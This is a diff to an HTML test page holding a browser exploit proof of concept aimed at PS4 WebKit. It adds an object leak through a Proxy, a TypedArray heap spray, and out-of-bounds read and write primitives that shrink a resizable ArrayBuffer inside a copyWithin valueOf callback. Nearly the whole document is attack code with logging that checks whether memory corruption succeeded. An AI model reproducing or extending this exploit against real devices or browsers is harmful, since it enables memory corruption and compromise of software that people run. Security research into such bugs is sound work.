@@ -1,61 +1,133 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <style>
-        #output {
-            font-family: monospace;
-            white-space: pre-wrap;
-            background-color: #333;
-            color: #00FF00;
-            padding: 10px;
-            border-radius: 5px;
-            margin-top: 20px;
-            width: 100%;
-            height: 200px;
-            overflow-y: auto;
-        }
-    </style>
+  <meta charset="utf-8">
+  <title>PS4 WebKit R/W Primitives</title>
+  <style>
+    body { background: #000; color: #0f0; font-family: monospace; }
+    #output {
+      white-space: pre-wrap;
+      padding: 1em;
+      border: 2px solid #0f0;
+      border-radius: 8px;
+      margin: 1em;
+      height: 400px;
+      overflow-y: auto;
+    }
+  </style>
 </head>
 <body>
-    <div id="output"></div>
-    <script>
-        // Function to log to the div
-        function logToDiv(message) {
-            const outputDiv = document.getElementById('output');
-            outputDiv.textContent += message + '\n';
+  <h1>PS4 WebKit R/W Primitives Test</h1>
+  <div id="output">[+] Starting…\n</div>
+  <script>
+    function logToDiv(msg) {
+      const out = document.getElementById('output');
+      out.textContent += msg + '\n';
+    }
+
+    /*************************************************************************
+     * Exploit 1: Leak a JS object via Proxy + super.prop
+     *************************************************************************/
+    function leakJSScope(obj) {
+      class Leaker extends Object {
+        leak() { return super.foo; }
+      }
+      Leaker.prototype.__proto__ = new Proxy({}, {
+        get(t, p, receiver) {
+          logToDiv(`[Leak] Receiver.constructor → ${receiver.constructor.name}`);
+          if ('byteLength' in receiver)
+            logToDiv(`[Leak] Receiver.byteLength → ${receiver.byteLength}`);
+          return 1;
         }
+      });
+      const foo = 42;
+      const { leak } = Leaker.prototype;
+      leak.call(obj);
+    }
 
-        logToDiv("[INFO] PsPEE v1.0 exploit for 11.02.");
+    window.onload = function() {
+      // 1) Confirm leak works on Uint8Array
+      logToDiv('[*] Leaking a Uint8Array object…');
+      leakJSScope(new Uint8Array(16));
 
-        // Exploit 1: Leak a JS object via Proxy + super.prop
-        function leakJSScope(obj) {
-            class Leaker extends Object {
-                leak() {
-                    return super.foo;
-                }
-            }
+      /*************************************************************************
+       * Stage 2: Setup victim + corruptor for OOB R/W via copyWithin underflow
+       *************************************************************************/
+      // Spray and pick one victim TypedArray
+      const victims = [];
+      for (let i = 0; i < 50; i++) {
+        let buf = new ArrayBuffer(0x100);
+        let u8  = new Uint8Array(buf);
+        u8.fill(0x41);   // fill with 0x41
+        victims.push(u8);
+      }
+      const victim = victims[25];
+      logToDiv('[*] Victim Uint8Array@0x100 allocated & filled with 0x41');
 
-            Leaker.prototype.__proto__ = new Proxy({}, {
-                get(target, prop, receiver) {
-                    // Instead of receiver.toString(), show constructor and byteLength
-                    logToDiv("[Leak] Receiver.constructor → " + receiver.constructor.name);
-                    if ('byteLength' in receiver) {
-                        logToDiv("[Leak] Receiver.byteLength → " + receiver.byteLength);
-                    }
-                    return 1;
-                }
-            });
+      // Create a resizable ArrayBuffer for corruptor
+      const corBuf = new ArrayBuffer(0x1000, { maxByteLength: 0x2000 });
+      const corU8  = new Uint8Array(corBuf);
+      // Pre-fill the first 16 bytes with 0x42 (for write test later)
+      corU8.fill(0);
+      corU8.set(new Uint8Array(16).fill(0x42), 0);
+      logToDiv('[*] Corruptor Uint8Array@0x1000 allocated, first 16 bytes = 0x42');
 
-            const foo = 42;
-            const { leak } = Leaker.prototype;
-            leak.call(obj);
+      /*************************************************************************
+       * Read primitive: copyWithin underflow to OOB-read victim’s memory
+       *************************************************************************/
+      let readCb = {
+        valueOf() {
+          logToDiv('[Underflow][Read] resizing corruptor → 0');
+          corBuf.resize(0);
+          return 0;   // target offset
         }
+      };
 
-        // Start the exploit on a TypedArray
-        window.onload = function() {
-            logToDiv("[*] Attempting to leak a Uint8Array as `this`…");
-            leakJSScope(new Uint8Array(16));
-        };
-    </script>
+      try {
+        logToDiv('[Underflow][Read] copyWithin start');
+        // copy 16 bytes from stale region into OOB; this may read victim memory
+        corU8.copyWithin(readCb, 0, 16);
+        logToDiv('[Underflow][Read] copyWithin complete');
+      } catch (e) {
+        logToDiv('[Underflow][Read] Exception: ' + e);
+      }
+
+      // Dump the first 16 bytes of corU8 to see what we grabbed
+      const leaked = Array.from(corU8.slice(0, 16))
+        .map(b => b.toString(16).padStart(2, '0'))
+        .join(' ');
+      logToDiv(`[Read] corU8[0..15] → ${leaked}`);
+
+      /*************************************************************************
+       * Write primitive: OOB-write into victim’s memory via corU8
+       *************************************************************************/
+      // Prepare corU8 data to write (0x43)
+      corU8.fill(0x43);
+
+      let writeCb = {
+        valueOf() {
+          logToDiv('[Underflow][Write] resizing corruptor → 0');
+          corBuf.resize(0);
+          return 0;   // target offset
+        }
+      };
+
+      try {
+        logToDiv('[Underflow][Write] copyWithin start');
+        corU8.copyWithin(writeCb, 0, 16);
+        logToDiv('[Underflow][Write] copyWithin complete');
+      } catch (e) {
+        logToDiv('[Underflow][Write] Exception: ' + e);
+      }
+
+      // Check the first 16 bytes of victim
+      const after = Array.from(victim.slice(0, 16))
+        .map(b => b.toString(16).padStart(2, '0'))
+        .join(' ');
+      logToDiv(`[Write] victim[0..15] → ${after}`);
+
+      logToDiv('[+] Done. If you see “43” in victim, write primitive succeeded!');
+    };
+  </script>
 </body>
 </html>
